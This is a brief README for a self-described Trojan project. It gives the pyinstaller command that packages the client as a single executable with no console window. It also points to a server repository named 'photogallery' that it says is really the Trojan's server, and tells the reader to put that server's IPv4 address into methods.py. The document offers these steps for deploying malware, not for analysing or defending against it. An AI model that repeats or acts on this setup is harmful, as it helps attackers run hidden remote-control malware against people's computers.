 
# This is a Trojan Project
- After downloading the project to your computer, open any terminal.
- Navigate to the directory where you installed the project, specifically the directory containing main.py.
- Use the following command to create the .exe file:
`pyinstaller --onefile --noconsole Main.py`

- Fork the base-expressjs-photogallery repository from my GitHub. Although it is named "photogallery," this project is actually the server for a Trojan. :))
- Make sure to replace the server’s IPv4 address in **methods.py** with the appropriate URL.
- 
There are no additional configurations needed beyond this point. If you prefer not to set up the project on your computer, you can view the introduction video here.
